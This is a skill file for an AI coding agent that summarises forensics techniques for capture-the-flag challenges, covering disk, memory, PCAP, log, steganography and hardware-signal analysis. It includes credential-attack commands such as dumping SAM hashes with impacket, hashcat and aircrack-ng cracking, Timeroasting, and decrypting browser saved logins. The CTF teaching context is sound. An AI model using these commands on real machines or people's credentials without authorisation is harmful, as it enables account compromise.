---
name: ctf-forensics
description: Provides digital forensics and signal analysis techniques for CTF challenges. Use when analyzing disk images, memory dumps, event logs, network captures, cryptocurrency transactions, steganography, PDF analysis, Windows registry, Volatility, PCAP, Docker images, coredumps, side-channel power traces, DTMF audio spectrograms, packet timing analysis, CD audio disc images, or recovering deleted files and credentials.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
category: ctf
---
# CTF Forensics & Blockchain

Quick reference for forensics CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install volatility3 Pillow numpy matplotlib
```

**Linux (apt):**
```bash
apt install binwalk foremost libimage-exiftool-perl tshark sleuthkit \
  ffmpeg steghide testdisk john pcapfix
```

**macOS (Homebrew):**
```bash
brew install binwalk exiftool wireshark sleuthkit ffmpeg \
  testdisk john-jumbo
```

**Ruby gems (all platforms):**
```bash
gem install zsteg
```

## Additional Resources

- [3d-printing.md](3d-printing.md) - 3D printing forensics (PrusaSlicer binary G-code, QOIF, heatshrink)
- [windows.md](windows.md) - Windows forensics (registry, SAM, event logs, recycle bin, NTFS alternate data streams, USN journal, PowerShell history, Defender MPLog, WMI persistence, Amcache)
- [network.md](network.md) - Network forensics basics (tcpdump, TLS/SSL keylog decryption, TLS master key extraction from coredump, Wireshark, PCAP, port scanning, SMB3 decryption, 5G/NR protocols, WordPress recon, credentials, USB HID steno, BCD encoding, HTTP file upload exfiltration, split archive reassembly via timestamp ordering)
- [network-advanced.md](network-advanced.md) - Advanced network forensics (packet interval timing encoding, USB HID mouse/pen drawing recovery, NTLMv2 hash cracking, TCP flag covert channel, DNS last-byte steganography, DNS trailing byte binary encoding, multi-layer PCAP with XOR + ZIP and mDNS key, Brotli decompression bomb seam analysis, SMB RID recycling via LSARPC, Timeroasting MS-SNTP hash extraction)
- [disk-and-memory.md](disk-and-memory.md) - Core disk/memory forensics (Volatility, disk mounting/carving, VM/OVA/VMDK, VMware snapshots, coredumps, Windows KAPE triage, PowerShell ransomware, Android forensics, Docker container forensics, cloud storage forensics, BSON reconstruction, TrueCrypt/VeraCrypt mounting)
- [disk-advanced.md](disk-advanced.md) - Advanced disk and memory techniques (deleted partitions, ZFS forensics, GPT GUID encoding, VMDK sparse parsing, memory dump string carving, ransomware key recovery, WordPerfect macro XOR, minidump ISO 9660 recovery, APFS snapshot recovery, RAID 5 XOR recovery, HFS+ resource fork recovery, SQLite edit history reconstruction)
- [disk-recovery.md](disk-recovery.md) - Disk recovery and extraction patterns (LUKS master key recovery, PRNG timestamp seed brute-force, VBA macro binary recovery, FemtoZip decompression, XFS filesystem reconstruction, tar duplicate entry extraction, nested matryoshka filesystem extraction, anti-carving via null byte interleaving, BTRFS subvolume/snapshot recovery, FAT16 free space data recovery, FAT16 deleted file recovery via Sleuth Kit fls/icat, ext2 orphaned inode recovery via fsck, corrupted ZIP header repair)
- [steganography.md](steganography.md) - General steganography (binary border stego, PDF multi-layer stego, SVG keyframes, PNG reorder, file overlays, GIF frame diff Morse code, GZSteg + spammimic, spreadsheet frequency recovery, Kitty terminal graphics protocol decoding, ANSI escape sequence steganography, autostereogram solving, two-layer byte+line interleaving, multi-stream video container stego, progressive PNG layered XOR decryption)
- [stego-image.md](stego-image.md) - Image-specific steganography (JPEG unused DQT table LSB, BMP bitplane QR extraction, image puzzle reassembly, F5 JPEG DCT ratio detection, PNG unused palette entry stego, QR code tile reconstruction, seed-based pixel permutation + multi-bitplane QR, JPEG thumbnail pixel-to-text mapping, conditional LSB with pixel filtering, JPEG slack space, nearest-neighbor interpolation stego, RGB parity steganography)
- [stego-advanced.md](stego-advanced.md) - Advanced steganography part 1: audio and signal techniques (FFT frequency domain, DTMF audio, SSTV+LSB, DotCode barcode, custom frequency dual-tone keypad, multi-track audio differential subtraction, cross-channel multi-bit LSB, audio FFT musical notes, audio metadata octal encoding, nested tar whitespace encoding, audio waveform binary encoding, audio spectrogram hidden QR)
- [stego-advanced-2.md](stego-advanced-2.md) - Advanced steganography part 2: video, image transform, and format-specific techniques (video frame accumulation, reversed audio, video frame averaging, JPEG XL TOC permutation steganography, Arnold's Cat Map descrambling, high-resolution SSTV custom FM demodulation, MJPEG FFD9 trailing byte stego, EXIF zlib + Stegano pixel patterns, PDF xref covert channel, ANSI escape code stego, pixel-wise ECB deduplication)
- [linux-forensics.md](linux-forensics.md) - Linux/app forensics (log analysis, Docker image forensics, attack chains, browser credentials, Firefox history, TFTP, TLS weak RSA, USB audio, Git directory recovery, KeePass v4 cracking, Git reflog/fsck squash recovery, browser artifact analysis (Chrome/Chromium/Firefox history, cookies, downloads, local storage, session restore), corrupted git blob repair via byte brute-force, VBA macro Excel cell data to ELF binary extraction, Python in-memory source recovery via pyrasite)
- [signals-and-hardware.md](signals-and-hardware.md) - Hardware signal decoding with decode code (VGA frame parsing, HDMI TMDS symbol decode, DisplayPort 8b/10b + LFSR descrambler), Voyager Golden Record audio, Saleae Logic 2 UART decode, Flipper Zero .sub files, side-channel power analysis (DPA), keyboard acoustic side-channel, CD audio disc image steganography (CIRC de-interleaving + spiral rendering), Linux input_event keylogger dump parsing, serial UART from WAV audio, USB MIDI Launchpad grid reconstruction

---

## When to Pivot

- If you recover an encrypted blob and the hard part becomes RSA, AES, or lattice work, switch to `/ctf-crypto`.
- If the evidence really points to malware staging, beacon config extraction, or packed samples, switch to `/ctf-malware`.
- If the artifact is a web app backup or API dump and the remaining problem is application logic, switch to `/ctf-web`.
- If the forensic evidence is really an encoding puzzle, steganography trick, or esoteric format rather than true forensics, switch to `/ctf-misc`.
- If you need to trace infrastructure, attribute actors, or investigate public records from forensic findings, switch to `/ctf-osint`.
- If the recovered artifact is a compiled binary or firmware that needs disassembly and analysis, switch to `/ctf-reverse`.

## Quick Start Commands

```bash
# File analysis
file suspicious_file
exiftool suspicious_file     # Metadata
binwalk suspicious_file      # Embedded files
strings -n 8 suspicious_file
hexdump -C suspicious_file | head  # Check magic bytes

# Disk forensics
sudo mount -o loop,ro image.dd /mnt/evidence
fls -r image.dd              # List files
photorec image.dd            # Carve deleted files

# Memory forensics (Volatility 3)
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.filescan
```

See [disk-and-memory.md](disk-and-memory.md) for full Volatility plugin reference, VM forensics, and coredump analysis.

## Log Analysis

```bash
grep -iE "(flag|part|piece|fragment)" server.log     # Flag fragments
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'  # Reconstruct
sort logfile.log | uniq -c | sort -rn | head         # Find anomalies
```

See [linux-forensics.md](linux-forensics.md) for Linux attack chain analysis and Docker image forensics.

## Windows Event Logs (.evtx)

**Key Event IDs:**
- 1001 - Bugcheck/reboot
- 1102 - Audit log cleared
- 4720 - User account created
- 4781 - Account renamed

**RDP Session IDs (TerminalServices-LocalSessionManager):**
- 21 - Session logon succeeded
- 24 - Session disconnected
- 1149 - RDP auth succeeded (RemoteConnectionManager, has source IP)

```python
import Evtx.Evtx as evtx
with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        print(record.xml())
```

See [windows.md](windows.md) for full event ID tables, registry analysis, SAM parsing, USN journal, and anti-forensics detection.

- **NTFS Alternate Data Streams (ADS):** Hidden data attached to files via named NTFS streams. Invisible to `dir`/Explorer. Detect with `fls -r image.dd | grep ":"`, extract with `icat`. See [windows.md](windows.md#ntfs-alternate-data-streams).

## When Logs Are Cleared

If attacker cleared event logs, use these alternative sources:
1. **USN Journal ($J)** - File operations timeline (MFT ref, timestamps, reasons)
2. **SAM registry** - Account creation from key last_modified timestamps
3. **PowerShell history** - ConsoleHost_history.txt (USN DATA_EXTEND = command timing)
4. **Defender MPLog** - Separate log with threat detections and ASR events
5. **Prefetch** - Program execution evidence
6. **User profile creation** - First login time (profile dir in USN journal)

See [windows.md](windows.md) for detailed parsing code and anti-forensics detection checklist.

## Steganography

```bash
steghide extract -sf image.jpg
zsteg image.png              # PNG/BMP analysis
stegsolve                    # Visual analysis
```

- **Binary border stego:** Black/white pixels in 1px image border encode bits clockwise
- **FFT frequency domain:** Image data hidden in 2D FFT magnitude spectrum; try `np.fft.fft2` visualization
- **DTMF audio:** Phone tones encoding data; decode with `multimon-ng -a DTMF`
- **Multi-layer PDF:** Check hidden comments, post-EOF data, XOR with keywords, ROT18 final layer
- **SSTV + LSB:** SSTV signal may be red herring; check 2-bit LSB of audio samples with `stegolsb`
- **SVG keyframes:** Animation `keyTimes`/`values` attributes encode binary/Morse via fill color alternation
- **PNG chunk reorder:** Fix chunk order: IHDR → ancillary → IDAT (in order) → IEND
- **File overlays:** Check after IEND for appended archives with overwritten magic bytes
- **APNG frame extraction:** Animated PNG has multiple frames; extract with `apngdis` or parse `fdAT`/`fcTL` chunks. See [steganography.md](steganography.md#apng-animated-png-frame-extraction-icectf-2016).
- **PNG height/CRC manipulation:** Modify IHDR height field, brute-force until CRC matches to reveal hidden rows. See [steganography.md](steganography.md#png-heightcrc-manipulation-for-hidden-content-h4ckit-ctf-2016).
- **Pixel coordinate chain stego:** Linked-list traversal where R=data byte, G/B=next pixel coordinates. See [stego-image.md](stego-image.md#pixel-coordinate-chain-steganography-h4ckit-ctf-2016).
- **AVI frame differential:** XOR consecutive video frames to reveal hidden data in pixel differences. See [stego-image.md](stego-image.md#avi-frame-differential-pixel-steganography-h4ckit-ctf-2016).

- **Custom freq DTMF:** Non-standard dual-tone frequencies; generate spectrogram first (`ffmpeg -i audio -lavfi showspectrumpic`), map custom grid to keypad digits, decode variable-length ASCII
- **JPEG DQT LSB:** Unused quantization tables (ID 2, 3) carry LSB-encoded data; access via `Image.open().quantization` and extract bit 0 from each of 64 values
- **Multi-track audio subtraction:** Two nearly-identical audio tracks in MKV/video; `sox -m a0.wav "|sox a1.wav -p vol -1" diff.wav` cancels shared content, flag appears in spectrogram of difference signal (5-12 kHz band)
- **Packet interval timing:** Identical packets with two distinct interval values (e.g., 10ms/100ms) encode binary; filter by interface, compute inter-packet deltas, threshold to bits

See [steganography.md](steganography.md), [stego-advanced.md](stego-advanced.md), and [stego-advanced-2.md](stego-advanced-2.md) for full code examples and decoding workflows.

## PDF Analysis

```bash
exiftool document.pdf        # Metadata (often hides flags!)
pdftotext document.pdf -     # Extract text
strings document.pdf | grep -i flag
binwalk document.pdf         # Embedded files
```

**Advanced PDF stego (Nullcon 2026 rdctd):** Six techniques -- invisible text separators, URI annotations with escaped braces, Wiener deconvolution on blurred images, vector rectangle QR codes, compressed object streams (`mutool clean -d`), document metadata fields.

See [steganography.md](steganography.md) for full PDF steganography techniques and code.

## Disk / VM / Memory Forensics

```bash
# Disk images
sudo mount -o loop,ro image.dd /mnt/evidence
fls -r image.dd && photorec image.dd

# VM images (OVA/VMDK)
tar -xvf machine.ova
7z x disk.vmdk -oextracted "Windows/System32/config/SAM" -r

# Memory (Volatility 3)
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>

# String carving
strings -a -n 6 memdump.bin | grep -E "FLAG|SSH_CLIENT|SESSION_KEY"

# Coredump
gdb -c core.dump  # info registers, x/100x $rsp, find "flag"
```

See [disk-and-memory.md](disk-and-memory.md) for full Volatility plugin reference, VM forensics, and VMware snapshots. See [disk-advanced.md](disk-advanced.md) for deleted partition recovery, ZFS forensics, and ransomware analysis.

## Windows Password Hashes

```bash
# Extract with impacket, crack with hashcat -m 1000
python -c "from impacket.examples.secretsdump import *; SAMHashes('SAM', LocalOperations('SYSTEM').getBootKey()).dump()"
```

See [windows.md](windows.md) for SAM details and [network-advanced.md](network-advanced.md) for NTLMv2 cracking from PCAP.

## Bitcoin Tracing

- Use mempool.space API: `https://mempool.space/api/tx/<TXID>`
- **Peel chain:** ALWAYS follow LARGER output; round amounts indicate peels

## Uncommon File Magic Bytes

| Magic | Format | Extension | Notes |
|-------|--------|-----------|-------|
| `OggS` | Ogg container | `.ogg` | Audio/video |
| `RIFF` | RIFF container | `.wav`,`.avi` | Check subformat |
| `%PDF` | PDF | `.pdf` | Check metadata & embedded objects |
| `GCDE` | PrusaSlicer binary G-code | `.g`, `.bgcode` | See 3d-printing.md |

## Common Flag Locations

- PDF metadata fields (Author, Title, Keywords)
- Image EXIF data
- Deleted files (Recycle Bin `$R` files)
- Registry values
- Browser history
- Log file fragments
- Memory strings

## WMI Persistence Analysis

**Pattern (Backchimney):** Malware uses WMI event subscriptions for persistence (MITRE T1546.003).

```bash
python PyWMIPersistenceFinder.py OBJECTS.DATA
```

- Look for FilterToConsumerBindings with CommandLineEventConsumer
- Base64-encoded PowerShell in consumer commands
- Event filters triggered on system events (logon, timer)

See [windows.md](windows.md) for WMI repository analysis details.

## Network Forensics Quick Reference

- **TFTP netascii:** Binary transfers corrupted; fix with `data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')`
- **TLS keylog decryption:** Import SSLKEYLOGFILE or RSA private key into Wireshark (Edit → Preferences → Protocols → TLS)
- **TLS weak RSA:** Extract cert, factor modulus, generate private key with `rsatool`, add to Wireshark
- **USB audio:** Extract isochronous data with `tshark -e usb.iso.data`, import as raw PCM in Audacity
- **NTLMv2 from PCAP:** Extract server challenge + NTProofStr + blob from NTLMSSP_AUTH, brute-force
- **WPA/WEP WiFi decryption:** `aircrack-ng -w wordlist capture.pcap` cracks WPA handshake; WEP cracked with enough IVs. See [network.md](network.md#wpawep-wifi-decryption-from-pcap-defcamp-ctf-2016).
- **PCAP repair:** `pcapfix -d corrupted.pcap` repairs broken PCAP headers/checksums for Wireshark loading. See [network.md](network.md#corrupted-pcap-repair-with-pcapfix-csaw-ctf-2016).
- **USB HID keyboard decoding:** Extract 8-byte HID reports from USB captures; byte 2 = keycode, byte 0 = modifiers (Shift). See [network-advanced.md](network-advanced.md#usb-hid-keyboard-capture-decoding-ekoparty-ctf-2016).
- **dnscat2 reassembly:** Decode hex/base32 subdomain labels, strip 9-byte dnscat2 header, deduplicate retransmissions, reassemble payload. See [network-advanced.md](network-advanced.md#dnscat2-traffic-reassembly-from-dns-pcap-bsidessf-2017).
- **USB keyboard LED exfiltration:** Host-to-device HID SET_REPORT packets toggle Caps Lock LED. Timing encodes Morse code. See [network-advanced.md](network-advanced.md#usb-keyboard-led-morse-code-exfiltration-bitsctf-2017).

See [network.md](network.md) for SMB3 decryption, credential extraction, and [linux-forensics.md](linux-forensics.md) for full TLS/TFTP/USB workflows.

## Browser Forensics

- **Chrome/Edge:** Decrypt `Login Data` SQLite with AES-GCM using DPAPI master key
- **Firefox:** Query `places.sqlite` -- `SELECT url FROM moz_places WHERE url LIKE '%flag%'`

See [linux-forensics.md](linux-forensics.md) for full browser credential decryption code.

## Additional Technique Quick References

- **Docker image forensics:** Config JSON preserves ALL `RUN` commands even after cleanup. `tar xf app.tar` then inspect config blob. See [linux-forensics.md](linux-forensics.md).
- **Linux attack chains:** Check `auth.log`, `.bash_history`, recent binaries, PCAP. See [linux-forensics.md](linux-forensics.md).
- **RAID 5 XOR recovery:** Two disks of a 3-disk RAID 5 → XOR byte-by-byte to recover the third: `bytes(a ^ b for a, b in zip(disk1, disk3))`. See [disk-advanced.md](disk-advanced.md#raid-5-disk-recovery-via-xor-crypto-cat).
- **PowerShell ransomware:** Extract scripts from minidump, find AES key, decrypt SMTP attachment. See [disk-and-memory.md](disk-and-memory.md).
- **Linux ransomware + memory dump:** If Volatility is unreliable, recover AES key via raw-memory candidate scanning and magic-byte validation; re-extract zip cleanly to avoid missing files/false negatives. See [disk-advanced.md](disk-advanced.md).
- **Deleted partitions:** `testdisk` or `kpartx -av`. See [disk-advanced.md](disk-advanced.md).
- **ZFS forensics:** Reconstruct labels, Fletcher4 checksums, PBKDF2 cracking. See [disk-advanced.md](disk-advanced.md).
- **BSON reconstruction:** Reassemble BSON (Binary JSON) documents from raw bytes; parse with `bson` Python library. See [disk-and-memory.md](disk-and-memory.md#bson-binary-json-format-reconstruction-icectf-2016).
- **TrueCrypt mounting:** Mount TrueCrypt/VeraCrypt volumes with known password using `veracrypt --mount` or `cryptsetup open --type tcrypt`. See [disk-and-memory.md](disk-and-memory.md#truecrypt-veracrypt-volume-mounting-grehack-ctf-2016).
- **Hardware signals:** VGA/HDMI TMDS/DisplayPort, Voyager audio, Saleae UART decode, Flipper Zero. See [signals-and-hardware.md](signals-and-hardware.md).
- **I2C protocol decoding:** Decode I2C bus captures (SDA/SCL lines) to extract data from EEPROM or sensor communications. See [signals-and-hardware.md](signals-and-hardware.md#i2c-bus-protocol-decoding-ekoparty-ctf-2016).
- **Punched card OCR:** Decode IBM-29 punch card images by mapping hole positions to characters using standard encoding grid. See [signals-and-hardware.md](signals-and-hardware.md#ibm-29-punched-card-ocr-ekoparty-ctf-2016).
- **USB HID mouse drawing:** Render relative HID movements per draw mode as bitmap; separate modes, skip pen lifts, scale 5-8x. See [network-advanced.md](network-advanced.md).
- **Side-channel power analysis:** Multi-dimensional power traces (positions × guesses × traces × samples). Average across traces, find sample with max variance, select guess with max power at leak point. See [signals-and-hardware.md](signals-and-hardware.md).
- **Packet interval timing:** Binary data encoded as inter-packet delays in PCAP. Two interval values = two bit values. See [network-advanced.md](network-advanced.md).
- **BMP bitplane QR:** Extract bitplanes 0-2 per RGB channel with NumPy; hidden QR often in bit 1 (not bit 0). See [stego-image.md](stego-image.md#bmp-bitplane-qr-code-extraction-steghide-bypass-ctf-2025).
- **Image puzzle reassembly:** Edge-match pixel differences between piece borders, greedy placement in grid. See [stego-image.md](stego-image.md#image-jigsaw-puzzle-reassembly-via-edge-matching-bypass-ctf-2025).
- **Audio FFT notes:** Dominant frequencies → musical note names (A-G) spell words. See [stego-advanced.md](stego-advanced.md).
- **Audio metadata octal:** Exiftool comment with underscore-separated octal numbers → decode to ASCII/base64. See [stego-advanced.md](stego-advanced.md).
- **G-code visualization:** Side projections (XZ/YZ) reveal text. See [3d-printing.md](3d-printing.md).
- **Git directory recovery:** `gitdumper.sh` for exposed `.git` dirs. See [linux-forensics.md](linux-forensics.md).
- **KeePass v4 cracking:** Standard `keepass2john` lacks v4/Argon2 support; use `ivanmrsulja/keepass2john` fork or `keepass4brute`. Generate wordlists with `cewl`. See [linux-forensics.md](linux-forensics.md).
- **Cross-channel multi-bit LSB:** Different bit positions per RGB channel (R[0], G[1], B[2]) encode hidden data. See [stego-advanced.md](stego-advanced.md).
- **F5 JPEG DCT detection:** Ratio of ±1 to ±2 AC coefficients drops from ~3:1 to ~1:1 with F5; sparse images need secondary ±2/±3 metric. See [stego-image.md](stego-image.md#f5-jpeg-dct-coefficient-ratio-detection-apoorvctf-2026).
- **PNG unused palette stego:** Unused PLTE entries (not referenced by pixels) carry hidden data in red channel values. See [stego-image.md](stego-image.md#png-unused-palette-entry-steganography-apoorvctf-2026).
- **Keyboard acoustic side-channel:** MFCC features from keystroke audio + KNN classification against labeled reference. 10ms window captures impact transient. See [signals-and-hardware.md](signals-and-hardware.md).
- **TCP flag covert channel:** 6 TCP flag bits (FIN/SYN/RST/PSH/ACK/URG) = values 0-63, encoding base64 characters. Nonsensical flag combos on a consistent dest port = covert data. See [network-advanced.md](network-advanced.md).
- **Brotli decompression bomb seam:** Compressed bomb has repeating blocks; flag breaks the pattern at a seam. Compare adjacent blocks to find discontinuity, decompress only that region. See [network-advanced.md](network-advanced.md).
- **Git reflog/fsck squash recovery:** `git rebase --squash` leaves orphaned objects recoverable via `git fsck --unreachable --no-reflogs`. See [linux-forensics.md](linux-forensics.md).
- **DNS trailing byte binary:** Extra bytes (`0x30`/`0x31`) appended after DNS question structure encode binary bits; 8-bit MSB-first chunks → ASCII. See [network-advanced.md](network-advanced.md).
- **Fake TLS + mDNS key + printability merge:** TCP stream disguised as TLS hides ZIP; XOR key from mDNS TXT record; merge two decrypted arrays by selecting printable characters. See [network-advanced.md](network-advanced.md).
- **Seed-based pixel permutation stego:** Deterministic pixel shuffle (Fisher-Yates with known seed) + multi-bitplane interleaved LSB extraction from Y channel → hidden QR code. See [stego-image.md](stego-image.md#seed-based-pixel-permutation-multi-bitplane-qr-l3m0nctf-2025).
- **BTRFS snapshot recovery:** Deleted files persist in BTRFS snapshots/alternate subvolumes. `mount -o subvol=@backup` accesses historical copies. See [disk-recovery.md](disk-recovery.md#btrfs-subvolumesnapshot-recovery-bsidessf-2026).
- **JPEG XL TOC permutation:** JXL's progressive TOC permutation controls tile convergence order during partial decode. Truncate at increasing offsets, measure which tiles converge first → convergence order encodes flag. See [stego-advanced-2.md](stego-advanced-2.md#jpeg-xl-toc-permutation-steganography-bsidessf-2026).
- **Kitty terminal graphics:** `ESC_G` protocol embeds zlib-compressed RGB image data in base64 chunks. Strip escape sequences, concatenate, decompress, reconstruct. See [steganography.md](steganography.md#kitty-terminal-graphics-protocol-decoding-bsidessf-2026).
- **ANSI escape sequence stego:** Flag text interleaved between ANSI color codes and braille characters. Invisible when rendered; extract by stripping escape sequences and non-ASCII. See [steganography.md](steganography.md#ansi-escape-sequence-steganography-in-terminal-art-bsidessf-2026).
- **Autostereogram solving:** Duplicate layer, difference blend, shift horizontally ~100px to reveal hidden 3D text. See [steganography.md](steganography.md#autostereogram-magic-eye-solving-bsidessf-2026).
- **Two-layer byte+line interleaving:** Two files byte-interleaved, then scanlines interleaved. Deinterleave even/odd bytes first (valid images), then even/odd lines. See [steganography.md](steganography.md#two-layer-byteline-interleaving-bsidessf-2026).
- **SMB RID recycling:** Guest auth + LSARPC `LsaLookupSids` with incrementing RIDs enumerates AD accounts from PCAP. See [network-advanced.md](network-advanced.md#smb-rid-recycling-via-lsarpc-midnight-2026).
- **Timeroasting (MS-SNTP):** NTP requests with machine RIDs extract HMAC-MD5 hashes from DC; crack with hashcat -m 31300. See [network-advanced.md](network-advanced.md#timeroasting-ms-sntp-hash-extraction-midnight-2026).
- **Android forensics:** Extract APK with `adb pull`, analyze with `apktool`, check `shared_prefs/` and SQLite databases in `/data/data/<package>/`. See [disk-and-memory.md](disk-and-memory.md#android-forensics).
- **Docker container forensics:** `docker save` exports layered tars; deleted files persist in earlier layers. `docker history --no-trunc` reveals build secrets. See [disk-and-memory.md](disk-and-memory.md#container-forensics-docker).
- **Cloud storage forensics:** S3/GCP/Azure versioning preserves deleted objects. `list-object-versions` recovers deleted flags. See [disk-and-memory.md](disk-and-memory.md#cloud-storage-forensics-aws-s3-gcp-azure).
- **APFS snapshot recovery:** Copy-on-write filesystem preserves historical file states in snapshots; use `icat` with different XID block offsets to read inodes across transaction IDs. See [disk-advanced.md](disk-advanced.md#apfs-snapshot-historical-file-recovery-srdnlenctf-2026).
- **Windows KAPE triage:** Pre-collected artifact ZIPs; start with PowerShell history → Amcache → MFT → registry hives. See [disk-and-memory.md](disk-and-memory.md#windows-kape-triage-analysis-utctf-2026).
- **WordPerfect macro XOR:** `.wcm` files contain macros with embedded encrypted data; XOR formula `(a+b)-2*(a&b)` = bitwise XOR. See [disk-advanced.md](disk-advanced.md#wordperfect-macro-xor-extraction-srdnlenctf-2026).
- **TLS master key from coredump:** Search coredump for session ID (from Wireshark handshake); read 48 bytes before it as master key. Create Wireshark pre-master-secret log file. See [network.md](network.md#tls-master-key-extraction-from-coredump-plaidctf-2014).
- **Corrupted git blob repair:** Single-byte corruption changes SHA-1; brute-force each byte position (256 × file_size) verifying with `git hash-object`. See [linux-forensics.md](linux-forensics.md#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015).
- **Split archive reassembly from PCAP:** Same-sized HTTP-transferred files with MD5-hash names are archive fragments; order by Apache directory listing timestamps, concatenate, extract password from TCP chat stream. See [network.md](network.md#split-archive-reassembly-from-http-transfers-asis-ctf-finals-2013).
- **Video frame accumulation:** Video with flashing images at various positions; composite all frames (per-pixel maximum) reveals hidden QR code or image. See [stego-advanced-2.md](stego-advanced-2.md#video-frame-accumulation-for-hidden-image-asis-ctf-finals-2013).
- **Reversed audio:** Garbled audio that sounds like speech played backwards; `sox audio.wav reversed.wav reverse` or Audacity Effect → Reverse reveals hidden message. See [stego-advanced-2.md](stego-advanced-2.md#reversed-audio-hidden-message-asis-ctf-finals-2013).
- **Multi-stream video container stego:** MP4/MKV with multiple video streams; default stream is a red herring, flag in secondary stream. `ffprobe -hide_banner file.mp4` to enumerate, `ffmpeg -i file.mp4 -map 0:1 -frames:v 1 flag.jpg` to extract. See [steganography.md](steganography.md#multi-stream-video-container-steganography-bsidessf-2026).
- **FAT16 free space recovery:** Flag hidden in unallocated clusters of FAT16 filesystem. Parse FAT table, enumerate free clusters (entry = 0x0000), read data region. See [disk-recovery.md](disk-recovery.md#fat16-free-space-data-recovery-bsidessf-2026).
- **FAT16 deleted file recovery (fls/icat):** FAT deletion replaces first byte of directory entry with `0xE5` but data remains. `fls -r -d image.img` lists deleted entries, `icat image.img <inode>` recovers by inode. See [disk-recovery.md](disk-recovery.md#fat16-deleted-file-recovery-via-sleuth-kit-metactf-flash-2026).
- **Ext2 orphaned inode recovery:** Deleted file leaves orphaned inode; `e2fsck -y disk.img` reconnects to `/lost+found`. Also use `debugfs` `lsdel` or `icat`. See [disk-recovery.md](disk-recovery.md#ext2-orphaned-inode-recovery-via-fsck-bsidessf-2026).
- **Linux input_event keylogger parsing:** 24-byte `struct input_event` binary dump; filter `type==1` (EV_KEY), `value==1` (press), map keycodes via `input-event-codes.h`. See [signals-and-hardware.md](signals-and-hardware.md#linux-inputevent-keylogger-dump-parsing-pwn2win-2016).
- **VBA macro cell data to binary:** Excel cells with numeric values; VBA `CByte((val-78)/3)` transforms to ELF bytes. Reimplement in Python, never run the macro. See [linux-forensics.md](linux-forensics.md#vba-macro-forensics---excel-cell-data-to-elf-binary-sharif-ctf-2016).
- **RGB parity steganography:** Sum R+G+B per pixel; even=white, odd=black renders hidden binary bitmap. See [stego-image.md](stego-image.md#rgb-parity-steganography-break-in-2016).
- **Hidden PDF objects:** Unreferenced content stream objects not in `/Kids` array. Add to `/Kids`, increment `/Count`, re-render. See [network-advanced.md](network-advanced.md#unreferenced-pdf-objects-with-hidden-pages-sharifctf-7-2016).
- **Arnold's Cat Map descrambling:** Periodic chaotic transform on square images; iterate forward map until original reappears. Period divides `3*N`. See [stego-advanced-2.md](stego-advanced-2.md#arnolds-cat-map-image-descrambling-nuit-du-hack-2017).
- **Python in-memory source recovery:** Attach `pyrasite-shell` to running Python process, decompile `func_code` objects with `uncompyle6` (Python <=3.8) or `pycdc` (Python 3.9+), dump `globals()` for secrets. See [linux-forensics.md](linux-forensics.md#python-in-memory-source-recovery-via-pyrasite-insomnihack-2017).
- **HFS+ resource fork recovery:** Hidden data in HFS+ Resource Forks invisible to `binwalk`/`foremost`; use HFSExplorer + 010 Editor HFS template to extract extent records. See [disk-advanced.md](disk-advanced.md#hfs-resource-fork-hidden-binary-recovery-confidence-ctf-2017).
- **Serial UART from WAV audio:** Square wave in audio encodes UART serial data; determine baud rate, parse start/stop bits, decode LSB-first byte frames. See [signals-and-hardware.md](signals-and-hardware.md#serial-uart-data-decoding-from-wav-audio-easyctf-2017).
- **High-resolution SSTV demodulation:** Standard SSTV decoders fail on high-sample-rate recordings; use manual FM demodulation via `arccos` + differentiation. See [stego-advanced-2.md](stego-advanced-2.md#high-resolution-sstv-custom-fm-demodulation-plaidctf-2017).
- **Corrupted ZIP header repair:** Fix filename length fields in both Local File Header (offset 26) and Central Directory (offset 28); fallback: brute-force raw deflate at candidate offsets. See [disk-recovery.md](disk-recovery.md#corrupted-zip-repair-via-header-field-manipulation-plaidctf-2017).
- **SQLite edit history reconstruction:** Replay insert/remove diffs from SQLite diff table to reconstruct document at every intermediate state; flag may have been typed then deleted. See [disk-advanced.md](disk-advanced.md#sqlite-edit-history-reconstruction-from-diff-table-google-ctf-2017).
- **MJPEG FFD9 trailing byte stego:** Extra bytes after JPEG EOI marker (FFD9) in MJPEG frames create invisible covert channel; split on FFD8, extract post-FFD9 data. See [stego-advanced-2.md](stego-advanced-2.md#mjpeg-extra-bytes-after-ffd9-steganography-polictf-2017).
- **USB MIDI Launchpad grid reconstruction:** MIDI Note On/Off in USB PCAP maps to 8x8 Launchpad grid (`key = row*16 + col`); reconstruct visual patterns from button press sequences. See [signals-and-hardware.md](signals-and-hardware.md#usb-midi-launchpad-traffic-reconstruction-sthack-2017).

## SMB RID Recycling via LSARPC (Midnight 2026)

Enumerate AD accounts from PCAP by analyzing LSARPC `LsaLookupSids` calls with sequential RIDs after Guest auth. Filter: `dcerpc.cn_bind_to_str contains lsarpc`.

See [network-advanced.md](network-advanced.md#smb-rid-recycling-via-lsarpc-midnight-2026) for full RPC call sequence and Wireshark filters.

## Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)

Extract crackable HMAC-MD5 hashes from MS-SNTP responses by sending NTP requests with machine account RIDs. Crack with `hashcat -m 31300`.

```bash
# Extract NTP payloads, convert to hashcat format, crack
tshark -r capture.pcapng -Y "ntp && ip.src == <DC_IP>" -T fields -e udp.payload
hashcat -m 31300 -a 0 -O hashes.txt rockyou.txt --username
```

See [network-advanced.md](network-advanced.md#timeroasting-ms-sntp-hash-extraction-midnight-2026) for payload parsing script and full attack chain.

## HTTP Exfiltration in PCAP

**Quick path:** `tshark --export-objects http,/tmp/objects` extracts uploaded files instantly. Check for multipart POST uploads, unusual User-Agent strings, and exfiltrated files (images with flag text). See [network.md](network.md#http-file-upload-exfiltration-in-pcap-metactf-2026).

## Common Encodings

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

